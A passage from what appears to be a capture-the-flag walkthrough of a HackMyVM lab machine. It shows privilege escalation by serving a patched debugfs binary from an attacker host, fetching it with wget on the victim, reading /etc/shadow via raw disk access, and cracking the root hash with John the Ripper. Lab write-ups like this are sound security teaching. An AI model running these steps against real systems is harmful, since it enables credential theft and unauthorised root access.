$ patchelf --shrink-rpath --allowed-rpath-prefixes /usr/lib:/foo/lib my-program
```
- Remove declared dependencies on dynamic libraries (`DT_NEEDED` entries):
```shell
$ patchelf --remove-needed libfoo.so.1 my-program
```
This option can be given multiple times.
- Add a declared dependency on a dynamic library (`DT_NEEDED`):
    ```shell
    $ patchelf --add-needed libfoo.so.1 my-program
    ```
This option can be give multiple times.
- Replace a declared dependency on a dynamic library with another one (`DT_NEEDED`):
    ```shell
    $ patchelf --replace-needed liboriginal.so.1 libreplacement.so.1 my-program
    ```
This option can be give multiple times.
- Change `SONAME` of a dynamic library:
    ```shell
    $ patchelf --set-soname libnewname.so.3.4.5 path/to/libmylibrary.so.1.2.3
    ```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ldd /usr/sbin/debugfs`:
```
        linux-vdso.so.1 (0x00007fff4e7a3000)
        libext2fs.so.2 => /lib/x86_64-linux-gnu/libext2fs.so.2 (0x00007f69078a9000)
        libe2p.so.2 => /lib/x86_64-linux-gnu/libe2p.so.2 (0x00007f690789e000)
        libss.so.2 => /lib/x86_64-linux-gnu/libss.so.2 (0x00007f6907895000)
        libcom_err.so.2 => /lib/x86_64-linux-gnu/libcom_err.so.2 (0x00007f690788f000)
        libblkid.so.1 => /lib/x86_64-linux-gnu/libblkid.so.1 (0x00007f6907830000)
        libuuid.so.1 => /lib/x86_64-linux-gnu/libuuid.so.1 (0x00007f6907824000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f690763f000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f6907971000)
```

`readelf -d /usr/sbin/debugfs | grep "NEEDED"`:
```
 0x0000000000000001 (NEEDED)             Shared library: [libext2fs.so.2]
 0x0000000000000001 (NEEDED)             Shared library: [libe2p.so.2]
 0x0000000000000001 (NEEDED)             Shared library: [libss.so.2]
 0x0000000000000001 (NEEDED)             Shared library: [libcom_err.so.2]
 0x0000000000000001 (NEEDED)             Shared library: [libblkid.so.1]
 0x0000000000000001 (NEEDED)             Shared library: [libuuid.so.1]
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
```

`mkdir ./patchelf && cd ./patchelf`

`cp /lib64/ld-linux-x86-64.so.2 ./`

`cp /lib/x86_64-linux-gnu/libc.so.6 ./`

`cp /usr/sbin/debugfs ./`

`patchelf ./debugfs --set-interpreter ./ld-linux-x86-64.so.2`

`patchelf ./debugfs --replace-needed libc.so.6 ./libc.so.6`

`python3 -m http.server 80`:
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... ←
```

![Victim: coralie](https://img.shields.io/badge/Victim-coralie-64b5f6?logo=linux&logoColor=white)

`wget http://192.168.56.118/debugfs`:
```
--2024-10-16 15:34:11--  http://192.168.56.118/debugfs
Connecting to 192.168.56.118:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 266497 (260K) [application/octet-stream]
Saving to: ‘debugfs’

debugfs                                         100%[====================================================================================================>] 260.25K  --.-KB/s    in 0.008s  

2024-10-16 15:34:11 (31.3 MB/s) - ‘debugfs’ saved [266497/266497]
```

`wget http://192.168.56.118/ld-linux-x86-64.so.2`:
```
--2024-10-16 15:34:34--  http://192.168.56.118/ld-linux-x86-64.so.2
Connecting to 192.168.56.118:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 210728 (206K) [application/octet-stream]
Saving to: ‘ld-linux-x86-64.so.2’

ld-linux-x86-64.so.2                            100%[====================================================================================================>] 205.79K  --.-KB/s    in 0.004s  

2024-10-16 15:34:34 (54.5 MB/s) - ‘ld-linux-x86-64.so.2’ saved [210728/210728]
```

`wget http://192.168.56.118/libc.so.6`:
```
--2024-10-16 15:34:42--  http://192.168.56.118/libc.so.6
Connecting to 192.168.56.118:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1933688 (1.8M) [application/octet-stream]
Saving to: ‘libc.so.6’

libc.so.6                                       100%[====================================================================================================>]   1.84M  --.-KB/s    in 0.03s   

2024-10-16 15:34:42 (61.5 MB/s) - ‘libc.so.6’ saved [1933688/1933688]
```

`chmod u+x ./debugfs ld-linux-x86-64.so.2 libc.so.6`

<🔄 Alternative Step.>

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`wget ftp.us.debian.org/debian/pool/main/e/e2fsprogs/e2fsprogs_1.47.0-2_amd64.deb`:
```                        
--2024-10-16 12:36:53--  http://ftp.us.debian.org/debian/pool/main/e/e2fsprogs/e2fsprogs_1.47.0-2_amd64.deb
Resolving ftp.us.debian.org (ftp.us.debian.org)... 64.50.236.52, 64.50.233.100, 208.80.154.139, ...
Connecting to ftp.us.debian.org (ftp.us.debian.org)|64.50.236.52|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 571372 (558K) [application/vnd.debian.binary-package]
Saving to: ‘e2fsprogs_1.47.0-2_amd64.deb’

e2fsprogs_1.47.0-2_amd64.deb                   100%[====================================================================================================>] 557.98K   357KB/s    in 1.6s    

2024-10-16 12:36:55 (357 KB/s) - ‘e2fsprogs_1.47.0-2_amd64.deb’ saved [571372/571372] ←
```

`dpkg-deb -x ./e2fsprogs_1.47.0-2_amd64.deb ./e2fsprogs`

`ls -l ./e2fsprogs`:
```
total 16
drwxr-xr-x 3 kali kali 4096 Mar  5  2023 etc
drwxr-xr-x 4 kali kali 4096 Mar  5  2023 lib
drwxr-xr-x 2 kali kali 4096 Oct 16 12:39 sbin
drwxr-xr-x 6 kali kali 4096 Mar  5  2023 usr
```

`file ./e2fsprogs/sbin/debugfs`:
```
./e2fsprogs/sbin/debugfs: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=97f96a4d2f0a52225e71bbfb83408bab27b0b6a3, for GNU/Linux 3.2.0, stripped
```

`python3 -m http.server 80 -d ./e2fsprogs/sbin`:
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... ←
```

![Victim: coralie](https://img.shields.io/badge/Victim-coralie-64b5f6?logo=linux&logoColor=white)

`wget http://192.168.56.118/debugfs`:
```
--2024-10-16 12:43:24--  http://192.168.56.118/debugfs
Connecting to 192.168.56.118:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 239440 (234K) [application/octet-stream]
Saving to: ‘debugfs’

debugfs                                         100%[====================================================================================================>] 233.83K  --.-KB/s    in 0.006s  

2024-10-16 12:43:24 (36.0 MB/s) - ‘debugfs’ saved [239440/239440] ←
```

`chmod u+x ./debugfs`

</🔄 Alternative Step.>

`./debugfs`:
```
debugfs 1.47.0 (5-Feb-2023)
debugfs:  open /dev/sda1 ←
```
```
debugfs:  cat /etc/shadow ←
root:$y$j9T$iAHGFf9E40kdt5eEY4R790$1Hnu3bkcGq69yrKAWBL9zuT1cLG16/ENdKsxR1omAqB:19779:0:99999:7:::
daemon:*:19779:0:99999:7:::
bin:*:19779:0:99999:7:::
sys:*:19779:0:99999:7:::
sync:*:19779:0:99999:7:::
games:*:19779:0:99999:7:::
man:*:19779:0:99999:7:::
lp:*:19779:0:99999:7:::
mail:*:19779:0:99999:7:::
news:*:19779:0:99999:7:::
uucp:*:19779:0:99999:7:::
proxy:*:19779:0:99999:7:::
www-data:*:19779:0:99999:7:::
backup:*:19779:0:99999:7:::
list:*:19779:0:99999:7:::
irc:*:19779:0:99999:7:::
_apt:*:19779:0:99999:7:::
nobody:*:19779:0:99999:7:::
systemd-network:!*:19779::::::
systemd-timesync:!*:19779::::::
messagebus:!:19779::::::
avahi-autoipd:!:19779::::::
sshd:!:19779::::::
ntpsec:!:19779::::::
epmd:!:19779::::::
melbourne:$y$j9T$9AW5vMwISGEth89TZdLQX.$3oxC.VAZ57n4S94eRdZzcsGbgIoiAxWTdCP7afTV7x2:19779:0:99999:7:::
coralie:$y$j9T$knJbyxpFrCvXDa/DDdck/1$GKzq8p7o9Qjurg6bzmM6TZtilp3qY8caDnkDYDJas35:19779:0:99999:7:::
debugfs:  q
```

`cat /etc/passwd`:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:101:109:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
ntpsec:x:103:111::/nonexistent:/usr/sbin/nologin
epmd:x:104:112::/run/epmd:/usr/sbin/nologin
melbourne:x:1000:1000:,,,:/home/melbourne:/bin/bash
coralie:x:1001:1001::/home/coralie:/bin/bash
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`vim ./root_passwd.txt`:
```
root:x:0:0:root:/root:/bin/bash
```

`vim ./root_shadow.txt`:
```
root:$y$j9T$iAHGFf9E40kdt5eEY4R790$1Hnu3bkcGq69yrKAWBL9zuT1cLG16/ENdKsxR1omAqB:19779:0:99999:7:::
```

`unshadow ./root_passwd.txt ./root_shadow.txt > ./root_unshadowed.txt`

`cat ./root_unshadowed.txt`:
``` 
root:$y$j9T$iAHGFf9E40kdt5eEY4R790$1Hnu3bkcGq69yrKAWBL9zuT1cLG16/ENdKsxR1omAqB:0:0:root:/root:/bin/bash
```

`john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt ./root_unshadowed.txt`:
```
Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
qazwsxedc        (root) ←
1g 0:00:00:06 DONE (2024-10-16 13:01) 0.1644g/s 331.5p/s 331.5c/s 331.5C/s amore..jesusfreak
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

`su root`:
```
Password: ←
```

![Victim: root](https://img.shields.io/badge/Victim-root-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
root ←
```

`id`:
```
uid=0(root) gid=0(root) groups=0(root) ←
```

`cd /root`

`ls -alps`:
```
total 288
  4 drwx------  4 root root   4096 Mar  3  2024 ./
264 drwxr-xr-x 18 root root 266240 May 28 11:22 ../
  0 lrwxrwxrwx  1 root root      9 Feb 26  2024 .bash_history -> /dev/null
  4 -rw-r--r--  1 root root    571 Apr 10  2021 .bashrc
  4 drwxr-xr-x  3 root root   4096 Mar  2  2024 .local/
  4 -rw-r--r--  1 root root    162 Feb 26  2024 .profile
  4 -rwx------  1 root root     33 Feb 26  2024 root.txt ←
  4 drwx------  2 root root   4096 Feb 26  2024 .ssh/
```

`cat ./root.txt`:
```
ac7f9*************************** ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
